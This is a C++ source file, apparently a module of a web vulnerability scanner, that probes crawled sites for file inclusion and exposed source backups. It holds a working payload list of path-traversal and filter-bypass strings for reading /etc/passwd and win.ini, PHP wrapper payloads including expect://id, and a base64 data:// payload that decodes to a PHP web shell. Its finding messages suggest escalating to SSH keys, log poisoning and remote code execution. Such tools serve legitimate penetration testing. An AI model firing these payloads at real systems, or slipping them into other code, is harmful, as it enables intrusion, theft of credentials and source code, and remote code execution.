/// @file scanners/path_traversal.cpp
/// @brief Advanced Path Traversal / LFI / RFI scanner with 30+ bypass techniques.
///        Reads /etc/passwd, win.ini, and extracts source code.
#include "scanner_base.hpp"
#include <regex>
#include <set>

namespace apex {
namespace {

/// Path traversal payloads with filter bypass variations.
struct TraversalPayload {
  std::string payload;
  std::string indicator;  // Expected content if successful
  std::string technique;
};

const std::vector<TraversalPayload> LFI_PAYLOADS = {
    // Basic traversal
    {"../../../etc/passwd", "root:", "basic traversal"},
    {"....//....//....//etc/passwd", "root:", "double dot-slash"},
    {"..%2f..%2f..%2fetc%2fpasswd", "root:", "URL encode slash"},
    {"..%252f..%252f..%252fetc%252fpasswd", "root:", "double URL encode"},
    {"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:", "full encode"},
    {"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "root:", "UTF-8 overlong /"},
    {"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "root:", "fullwidth slash"},
    {"....\\\\....\\\\....\\\\etc\\\\passwd", "root:", "backslash variation"},
    {"..%5c..%5c..%5cetc%5cpasswd", "root:", "encoded backslash"},
    {"/etc/passwd", "root:", "absolute path"},
    {"file:///etc/passwd", "root:", "file:// protocol"},

    // Windows
    {"..\\..\\..\\windows\\win.ini", "[fonts]", "Windows basic"},
    {"..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "Windows encoded"},

    // Null byte bypass (PHP < 5.3.4)
    {"../../../etc/passwd%00", "root:", "null byte terminator"},
    {"../../../etc/passwd%00.png", "root:", "null byte + ext"},

    // Wrapper bypass (PHP)
    {"php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd", "PHP filter base64"},
    {"php://filter/read=string.rot13/resource=/etc/passwd", "ebbg", "PHP filter rot13"},
    {"php://input", "", "PHP input wrapper"},
    {"expect://id", "uid=", "expect wrapper"},
    {"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", "", "data wrapper"},

    // Path truncation
    {std::string(2048, '.') + "/etc/passwd", "root:", "path truncation"},
};

/// Find parameters likely to accept file paths.
std::vector<std::pair<std::string, std::string>> find_file_params(const CrawlResult &crawl) {
  std::vector<std::pair<std::string, std::string>> targets;
  std::regex file_param_re(R"x([?&](file|path|page|include|template|doc|document|folder|root|dir|pg|style|pdf|img|filename|filepath|view|content|layout|mod|inc|func|load|read|fetch|src|resource|cat|action|lang|locale|theme)=)x");

  for (const auto &url : crawl.urls) {
    std::sregex_iterator it(url.begin(), url.end(), file_param_re);
    std::sregex_iterator end;
    for (; it != end; ++it) {
      std::string param = (*it)[1].str();
      std::string base_url = url.substr(0, url.find(param + "=") + param.size() + 1);
      targets.push_back({base_url, param});
    }
  }
  return targets;
}

/// Main LFI/path traversal scanner.
std::vector<Finding> scan_lfi(const Config &, HttpClient &http,
                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  auto targets = find_file_params(crawl);

  // Also try common file inclusion endpoints
  if (targets.empty()) {
    std::vector<std::string> common = {
        base + "/?page=", base + "/?file=", base + "/?include=",
        base + "/?template=", base + "/?path=", base + "/api?file=",
        base + "/?lang=", base + "/?view="};
    for (const auto &u : common) {
      targets.push_back({u, "file"});
    }
  }

  for (const auto &[inject_url, param] : targets) {
    for (const auto &p : LFI_PAYLOADS) {
      auto resp = http.get(inject_url + p.payload);
      if (resp.status_code == 200 && !p.indicator.empty() &&
          resp.body.find(p.indicator) != std::string::npos) {
        findings.push_back(Finding{"Local File Inclusion — " + p.technique, "critical",
                            inject_url + p.payload,
                            "LFI confirmed via " + p.technique + ". "
                            "Successfully read system file. Indicator found: '" + p.indicator + "'. "
                            "Escalation: read source code, config files, SSH keys, or use "
                            "log poisoning / PHP wrappers for RCE.",
                            param, p.payload, resp.body.substr(0, 300)});
        return findings; // Critical, stop
      }
    }
    break; // Test first target
  }

  return findings;
}

/// Remote File Inclusion scanner.
std::vector<Finding> scan_rfi(const Config &, HttpClient &http,
                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  auto targets = find_file_params(crawl);
  if (targets.empty()) return findings;

  // Test RFI with a safe external URL
  for (const auto &[inject_url, param] : targets) {
    auto resp = http.get(inject_url + "https://httpbin.org/robots.txt");
    if (resp.status_code == 200 && resp.body.find("Disallow") != std::string::npos) {
      findings.push_back(Finding{"Remote File Inclusion", "critical", inject_url + "https://httpbin.org/robots.txt",
                          "Server includes content from external URL. "
                          "Attacker can include a remote PHP shell for full RCE.",
                          param, "https://httpbin.org/robots.txt",
                          "External content fetched and included in response"});
      return findings;
    }
    break;
  }
  return findings;
}

/// Source code disclosure via backup/alternative extensions.
std::vector<Finding> scan_source_disclosure(const Config &, HttpClient &http,
                                             const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Find script files in crawled URLs
  std::regex script_re(R"x(/([^?#]+\.(php|asp|aspx|jsp|py|rb)))x");
  std::set<std::string> scripts;

  for (const auto &url : crawl.urls) {
    std::smatch m;
    if (std::regex_search(url, m, script_re)) {
      scripts.insert(m[0].str());
    }
  }

  // Also try common paths
  scripts.insert("/index.php");
  scripts.insert("/config.php");
  scripts.insert("/wp-config.php");

  std::vector<std::string> suffixes = {
      "~", ".bak", ".old", ".orig", ".save", ".swp", ".swo",
      ".tmp", ".inc", ".txt", ".dist", ".sample", ".1", ".copy"};

  for (const auto &script : scripts) {
    for (const auto &suffix : suffixes) {
      auto resp = http.get(base + script + suffix);
      if (resp.status_code == 200 && resp.body.size() > 50 &&
          (resp.body.find("<?php") != std::string::npos ||
           resp.body.find("import ") != std::string::npos ||
           resp.body.find("require") != std::string::npos ||
           resp.body.find("function ") != std::string::npos ||
           resp.body.find("class ") != std::string::npos)) {
        findings.push_back(Finding{"Source Code Disclosure — " + script + suffix, "high",
                            base + script + suffix,
                            "Backup/alternate version of source file publicly accessible. "
                            "Reveals application logic, database credentials, API keys.",
                            "", script + suffix, resp.body.substr(0, 300)});
        return findings;
      }
    }
    if (!findings.empty()) break;
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_path_traversal_scanners() {
  return {
      {"LFI", scan_lfi},
      {"RFI", scan_rfi},
      {"Source Disclosure", scan_source_disclosure},
  };
}

} // namespace apex
